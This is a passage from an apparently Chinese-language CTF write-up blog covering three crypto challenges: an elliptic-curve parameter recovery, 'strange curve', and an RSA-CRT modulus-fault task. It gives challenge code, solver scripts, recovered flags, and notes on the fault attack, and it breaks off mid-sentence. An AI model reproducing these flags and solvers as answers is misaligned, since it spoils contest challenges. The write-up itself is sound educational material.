class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = <span class="number">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line">b = <span class="number">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line">x1 = <span class="number">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line">x2 = <span class="number">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PR.&lt;a&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">tmp = <span class="number">4</span>*(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">f = x2*tmp+(x1+x1)*tmp-(<span class="number">3</span>*x1^<span class="number">2</span>+a)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(f.roots())</span><br><span class="line"><span class="comment"># [(918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050, 1), (56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325, 1)]</span></span><br><span class="line">a = <span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(a)))</span><br><span class="line"><span class="comment"># flag&#123;fa76cfb1-0052-4416-914d-91517bcebd52&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{fa76cfb1-0052-4416-914d-91517bcebd52}</p></blockquote><h2 id="strange-curve"><a href="#strange-curve" class="headerlink" title="strange curve"></a>strange curve</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">P,Q</span>):</span></span><br><span class="line">    (x1,y1)=P</span><br><span class="line">    (x2,y2)=Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    x3=(x1+x2)*(<span class="number">1</span>+y1*y2)*invert((<span class="number">1</span>+x1*x2)*(<span class="number">1</span>-y1*y2),p)%p</span><br><span class="line">    y3=(y1+y2)*(<span class="number">1</span>+x1*x2)*invert((<span class="number">1</span>-x1*x2)*(<span class="number">1</span>+y1*y2),p)%p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (x3,y3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">e,P</span>):</span></span><br><span class="line">    Q=(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    e=e%p</span><br><span class="line">    <span class="keyword">while</span> e:</span><br><span class="line">        <span class="keyword">if</span> e&amp;<span class="number">1</span>:</span><br><span class="line">            Q=add(Q,P)</span><br><span class="line">        P=add(P,P)</span><br><span class="line">        e&gt;&gt;=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Legendre</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>((a%p+p)%p,(p-<span class="number">1</span>)//<span class="number">2</span>,p))%p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ts</span>(<span class="params">p</span>):</span></span><br><span class="line">    p=p-<span class="number">1</span></span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">        p=p//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> count,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_nonre</span>(<span class="params">p</span>):</span></span><br><span class="line">    a=random.randint(<span class="number">1</span>,p)</span><br><span class="line">    <span class="keyword">while</span> Legendre(a,p)==<span class="number">1</span>:</span><br><span class="line">        a=random.randint(<span class="number">1</span>,p)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">amm2</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    t,s=get_ts(p)</span><br><span class="line">    ta=<span class="built_in">pow</span>(get_nonre(p),s,p)</span><br><span class="line">    tb=<span class="built_in">pow</span>(a,s,p)</span><br><span class="line">    h=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,t):</span><br><span class="line">        d=<span class="built_in">pow</span>(tb,<span class="number">2</span>**t-<span class="number">1</span>-i,p)</span><br><span class="line">        <span class="keyword">if</span> d==<span class="number">1</span>:</span><br><span class="line">            k=<span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line">        tb=(tb*<span class="built_in">pow</span>(ta,<span class="number">2</span>*k,p))%p</span><br><span class="line">        h=(h*<span class="built_in">pow</span>(ta,k,p))%p</span><br><span class="line">        ta=<span class="built_in">pow</span>(ta,<span class="number">2</span>,p)</span><br><span class="line">    <span class="keyword">return</span> h*<span class="built_in">pow</span>(a,(s+<span class="number">1</span>)//<span class="number">2</span>,p)%p  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">a,b,c,p</span>):</span></span><br><span class="line">    tmpa=<span class="number">1</span></span><br><span class="line">    tmpb=b*inverse(a,p)%p</span><br><span class="line">    tmpc=c*inverse(a,p)%p</span><br><span class="line">    <span class="keyword">assert</span> Legendre(tmpb**<span class="number">2</span>*inverse(<span class="number">4</span>,p)-tmpc,p)==<span class="number">1</span></span><br><span class="line">    res1=(amm2(tmpb**<span class="number">2</span>*inverse(<span class="number">4</span>,p)-tmpc,p)-tmpb*inverse(<span class="number">2</span>,p))%p</span><br><span class="line">    res2=(-amm2(tmpb**<span class="number">2</span>*inverse(<span class="number">4</span>,p)-tmpc,p)-tmpb*inverse(<span class="number">2</span>,p))%p</span><br><span class="line">    <span class="keyword">return</span> (res1,res2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lift</span>(<span class="params">x,a,b,p</span>):</span></span><br><span class="line">    tmp=b*(x**<span class="number">2</span>-<span class="number">1</span>)*inverse(a*x,p)%p</span><br><span class="line">    <span class="keyword">return</span> solve(<span class="number">1</span>,-tmp,-<span class="number">1</span>,p)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p=<span class="number">9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353</span></span><br><span class="line">a=<span class="number">54733430689690725746438325219044741824500093621550218736194675295708808435509</span></span><br><span class="line">b=<span class="number">75237024593957256761258687646797952793573177095902495908321724558796076392871</span></span><br><span class="line">x=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        y=lift(x,a,b,p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> a*x*(y**<span class="number">2</span>-<span class="number">1</span>)%p==b*y*(x**<span class="number">2</span>-<span class="number">1</span>)%p</span><br><span class="line"></span><br><span class="line">P=(x,y)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">eP=mul(e,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;P&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;eP = <span class="subst">&#123;eP&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)</span></span><br><span class="line"><span class="string">eP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>前面都不用看，给了P点就有x、y，得解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">x, y = (<span class="number">56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149</span>, <span class="number">5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag = libnum.n2s(x)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    x -= <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{b7f209df-1284-4bdf-b030-28197483c47b}</p></blockquote><h2 id="learning-with-fault（复现）"><a href="#learning-with-fault（复现）" class="headerlink" title="learning_with_fault（复现）"></a>learning_with_fault（复现）</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><ul><li><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSA</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,p,q,e</span>):</span></span><br><span class="line">        self.p=p</span><br><span class="line">        self.q=q</span><br><span class="line">        self.e=e</span><br><span class="line">        self.phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        self.d=invert(self.e,self.phi)</span><br><span class="line">        self.dp=self.d%(p-<span class="number">1</span>)</span><br><span class="line">        self.dq=self.d%(q-<span class="number">1</span>)</span><br><span class="line">        self.n=p*q</span><br><span class="line">        self.N=getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">self,message</span>):</span></span><br><span class="line">        m=bytes_to_long(message)</span><br><span class="line">        sig_p=<span class="built_in">pow</span>(m,self.dp,self.p)</span><br><span class="line">        sig_q=<span class="built_in">pow</span>(m,self.dq,self.q)</span><br><span class="line">        alpha=q*invert(q,p)</span><br><span class="line">        beta=p*invert(p,q)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">corrupt_sign</span>(<span class="params">self,message</span>):</span></span><br><span class="line">        m=bytes_to_long(message)</span><br><span class="line">        sig_p=<span class="built_in">pow</span>(m,self.dp,self.p)</span><br><span class="line">        sig_q=<span class="built_in">pow</span>(m,self.dq,self.q)</span><br><span class="line">        alpha=q*invert(q,p)</span><br><span class="line">        beta=p*invert(p,q)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self,message,sign</span>):</span></span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(sign),self.e,self.n))==message</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">rsa=RSA(p,q,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sign.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;corrupted_sign.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            message=os.urandom(<span class="number">64</span>)</span><br><span class="line">            sign=rsa.sign(message)</span><br><span class="line">            corrupted_sign=rsa.corrupt_sign(message)</span><br><span class="line">            <span class="keyword">assert</span> rsa.verify(message,sign)</span><br><span class="line">            f1.write(<span class="built_in">str</span>(sign)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            f2.write(<span class="built_in">str</span>(corrupted_sign)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">enc=<span class="built_in">pow</span>(bytes_to_long(flag),rsa.e,rsa.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;rsa.n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;rsa.N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;rsa.e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class="line">N = <span class="number">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">enc = <span class="number">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br></pre></td></tr></table></figure></li><li><p>sign.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\t\x8b\xde\x98\x84\x1d\x9e\xd4\xa0\xb7f\xe0\x05\xb1\xbd8\xb9G\xe3\x0c\x83\x8a\xe5\xf0G7\x12\x1eT\x85o-B\xe4_\xd2\x04\xd9:\xab\xdf\xa1 \x8f\xedt+\x0f\xce\xb5\x90\xaaK\xf0U~v=\x84\xe7$G\xf5\xfb\xd3ok~V\x1a\xec&amp;\x15\x18Y\x0c\x80u\xafF\xf1\x10\x9f\xf2\xe6\xa6\x9a\xbb\xbd+\xa4l\xa9\x11\xd5\t\x13\x16\xa3\xde\xe1\xdfZ\xa9$r\xb5`\xc9&quot;\x11\xab\xc5\x87\xc4\x1d@\x9e\xa4t\xdb#\xbdj\xcb\x95\xefK&#x27;</span></span><br><span class="line"><span class="string">b&#x27;z/\xd6\xfb\xd8\xfa\xc4\xed\xbd\x99\xd0\xa0\x90\xcb\xca\x83\xd8B\xa7\xf4\xbd\xe0\xc2&amp;\x1aQl(\xd6p\x8f\x89=tT\xf1(\xeb\xab\x84[oR\x1fl=\xda\xf5\x18q\x8f\xa7k\x00\x1b\x1a\x0ei\x1fa.ho\x15\x04\x12\xe4\xc2\xd7\x19\x92\xc3\x9b\xfe\xd5\xb6R\xf8\x95\x9fr\x93\xddD\x1c[\x873\xd5\x06\x1b\xa5\x82/6\x9a\x13\xcf\xa4\xcd\x0e]\t\xad?\xd6\x84\r\x90\xef\x86\xf15)\xe34\xf7\xb77\xef\x0c&amp;\xdb8\xa6\xe0\xa5a&#x27;</span></span><br><span class="line"><span class="string">b&#x27;U\x0b\xf6\x9cm])1\xe2\xad\xf9G\x8f\xa2\xbc&#125;\xd7\x18\x89\xa4\xfdFQ\x80m&quot;\xf9\to^\xd9A\x98\xd2\xca\x1e(b\xa8\xbe\xc2m\xf7\n[O\x00\xbc\x87\x17\xed\x0cG\xf2=H\x0e\xc0\x14+\xcb\xd0\x1feT2\xf2Th\xec\xc2\xcf&gt;6,&lt;\x88X\x8f\xe9g\xa8\x00\xafr\x05\x95\rj\x9c\xc6\n\xbb\x8a\x019\xc1\x1ef#\x02[Rh\xd8\xdc|&#123;6\xeb\xe8U\x91\xa4\xeb&#125;\xf4s;E\xe72$i\xdft\xff\&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;[\x94\x95T\xf4\xc4\xca\x8drO\x80\x14\xc9&lt;H\xa2a\xdc\xf4`\xac&gt;\xab\x03\xfa\x80Sx\x99\x14\x83$U\x0b\xfa\x8fv\xfd\xda\x1a\xa0\xebY\xaa\x01\xe2XsG\t\xcf\xae\xa0\xbf\x82iG\tQ \xb1\xfe\xa5k\x12\xd9\x12\xf7\x95\xa3\xa5\x8d`z\x19\x1a\x90-\x9aj\x15\xf6f&gt;\x18\x08\xb8\x1f\x88\x1a\x80Th\xd0\x15\x9bw#\&#x27;`K\xa5\xf1\xbf&quot;\xe79\xaf\xc7z%p\xa5\x9f\x14\xef\&#x27;1\x11\x05Gg\xe9\xda\xc9\x18~[&#x27;</span></span><br><span class="line"><span class="string">b&#x27;:\xefRE\xd7\xa1?\xf3\xb5\xf7\xdd\xe2\xb6~\x85014\xc0\x8a\x80\xe1\xb5#\x94\x10\xb2\xa0\xfe\x87\xd1t\xc3$&amp;\xde8\x195\xcd\xf4@3\x15\xcaK\xcc\xcd\r:\x83*\xd7l\xb6\xf2&#125; \tJ\xb5xKfjh.\xfb\xb5\x91\xc6\xf2x\x8e\x83\xdc\xc3\xef\x8b\x8dW\xa6\xa6\xb0w\xd8\xf2G\xa5-\xc3\x87\x17;\xedH`:\xcd\x08ts\x9eqPE\xd7\xfc\xc4\x98\xb5\xe0\xad\xb7A\x7f\xcb\x01\xbd\x98\xd3Ea\xb9\x07\x80\xf8\x19&#x27;</span></span><br><span class="line"><span class="string">b&quot;8\xca\x7f!;\\\xde\x1b\x80i\x9b!\x1c??u\x13\x955\xd0xG\xff\xd7\xba\xfe+\x95\x0eu^\x15\x1a\x0e*\xfe\x8a\xafM\xc0\xd1Ty\xd7\xf1\xa7@\xd6\xa6\xee\x0c:It\x1a\xeag\xfc\x0c\xaf\x02&lt;\x03T)\xeb\xb0\x15\x1cz\x85\x992\xa9\xbe\x9bm\xc4D\x83\xf7\xb5T\xdd9?\x94\xd4\x13\xb4\xb3\x8d\xa9\x92\x9dt\x86\xdb\x0b$\x19l\xb1\xb9\x05&#x27;o\xf3!\t\x01\x93&#x27;z\x15P\x88\xd7iN\n\x8bA\xb5\xd2&#125;\xe8\x10&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>corrupted_sign.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;\x17\x8bb3\x11\x1b\xb9\xb9\xc6M\xb0\xaa\x07-\x1ar\xff\xfb\xb4&amp;H7!\xb8\xa1\xce\x07\x8b\x84M\x0bw=m\x193Oc\x97w\x8f\xffy4\xa1\x99\xfcW\xf9|\xeb\xa4\x00\x1eD*\xe8-&#x27;\xa9\xef\x9d\x13*\xf4\xbe\x9d\x9b&amp;w\xcb\xfd\xb3\xb6\xa3n\xb8\xb4\x97vT\xec@\x86\xd1R\xb0\n\xe1uC\xbc\x14\xeb\xceSu&amp;&#x27;&#123;\xb9\x12\x90\x82\xc7,\xdbr\xebP\xe1j\x11E\xd5\x17\xe1\xd0D\xe7z\x94vt\xbf\x1a\xc4+&quot;</span></span><br><span class="line"><span class="string">b&#x27;\x1dJ\xc5\xb2\xbe\x05\xe6\xc8T\n\xbe&quot;\xbeU\xed\xba\xec\x85\x05\x8b\x8ayE\xa3&#125;0\x1dk\xa7\x10\xe2E\x19\xfe\x10\x90\xef\r\xdbV\x8b\x87|(\xd1\xb5\xfd\xb9\x14\x84\x05\x03\x81\xc8\xf6\xe5\x8a\x92\xa0\x01I\x8aG:\xc19\x9e\xf0\x8eZ\\Yx\x80|\xb7\x80\x0e\xcd\xa3\xba6\xf8\x98\xb1pB\x05\x8aT#\xbf\x1e\x1b~\xcb\xf5\t\xa2H9\xc9n\x81e\xa2\x15\x97\x11\xe4\x93\xf2\xe6\x80\x97\x99G\xb5\xfe\x07/\xd2\xbd\xad\xcf\x04\x9e\xd0&#x27;</span></span><br><span class="line"><span class="string">b&#x27;Gs\xda\xb8\x8a\x85\xccK\xf7\xa8y\x16\xa5\xf0\x06\xbe\xeb\x83&amp;&#125;a\x85q\x8d:\x1fSb\xb8\xc5\x84\xba*[\xe7\xbb&#123;\x86\xd3\xb3r\xb6\xaaCN\x93\x1d&lt;(\xe2\x1c;\x8crU\x8fD=W\xa7\x0b\xc7\xeag\x96\x06\xd6\xbb\xe4\x04b\xd8\x02\x12\xd6\xfa2\x1e#\xf0\xde\x8b\x88M\xd2\xf47\\\x98\xe0\x04Fu\x1bsy\xf2\xc4\xad\xd6Y\x81u~B:\xd2\x1f\xb3\xab\x01:\xfa\xdf\x19J8\xd0\x18RN\xfe,CA\x15\xb3\xe0&#x27;</span></span><br><span class="line"><span class="string">b&quot;0I\xda5\x9f\x05v\x17\xdc\xd4q\xd6\x83,\x9d\r\xccc\x8a\xa1\xd4U\xd3\x18\xc9\xc6g\xcd\nX\x99Ah\xed&#125;\xf3\xb1(\xd5I\xc6\x0f@yw9\x9d\xfdv\x15x\xeaRA\xd6\xb0\x1e\xb5B\xe5\x05cc\x06m\xf4NN&#x27;\x02q\x1a\x11\xe4\x87P:\xc8\x11a\x9f\xbd\x9c\x98x\xda\xea\xc4\xa8f\x89s\xcaJ\x7f\xeb\xd8\xc1G#\xf4\xdc\xe2\x01\xf2\xa5\x95\x19`)2!\xf5\xb9\xf0\xf2\xbb\xf8\x0bF&amp;&amp;`\xfd*\xe1\xf2\x9c&quot;</span></span><br><span class="line"><span class="string">b&#x27;:\x99/Hxt\xd1\xd4\xaaB\xd6H\x16\xe1\xc9\xe2\xb3\xc3\xa9b\xd3\x96\x9c\x05x6\xf1\xc3d\xa2\xd1U+.\x1b\xac^\xf6Mh7\xb7\x03\x8e\xdc\xca\x0bn\xac\xed\x92\xb8x\x04)\x0f|\x11\xcc\xfa\xf2\\\xba\xee\xc4X\xa8(\x05\xf2\xb5\x8f&amp;\xf3\xff\x1eB\xe7\x94\xf4\xa6\x00!\xe5v\xd9x\xf0s\x94\xf4D(\xa9g\x118\xa7z\x83\xad\xdb\xe6\xe3\xe7\xf8\xf2\xef\xe5@\xe9\x13\x00OB\xcc\x05\xd1,_=\xd2/Og\x81\xa6+&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x1c|\xb6\xcc\xdfj\xc5\xa0s\xac w\xa6\xf2\x87D\xe3\xf9Y\xf5=\xf0\x0b\xd9\xea\x89,+e\x1e\xb7m#\x99\xd1\x87\x17Z\xed\x1d\xc8\x97;\xa0K\x05.\xaa&lt;\xc6s\xcf\xa2\xa2\\PO\x12&amp;\xb4\x11\xec\xad\x10\xf8\xf7\xd1\xd3_\x80\x17\xe0\x1eP\x93\xe3\xc2\x1e\x03\xea]^\xc6a\x9c\xcb\x90\xbb\x9f\x8by\xa5dhM\xce\xc7\xbc\xf7\xafe\xcf\xc1\xf1\x18@\x1e\xe2\xdb\xfb\xe4^\xc8\xe7\x19\xccnY\xc6o\x7fL\x9fV\xd4\xc4\x15\xe8&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>搜得论文<a href="https://eprint.iacr.org/2011/388.pdf">Modulus Fault Attacks Against RSA-CRT Signatures</a>，获得解题思路</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220818024416469.png" alt="image-20220818024416469"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220818024512338.png" alt="image-20220818024512338"></p><p>赛时因为没接触过正交格，论文描述过于言简意赅，两小时构造均以失败告终</p><p>赛后hash师傅指出正交格在D^3出现过（遗憾自己未参与）</p><p>在<a 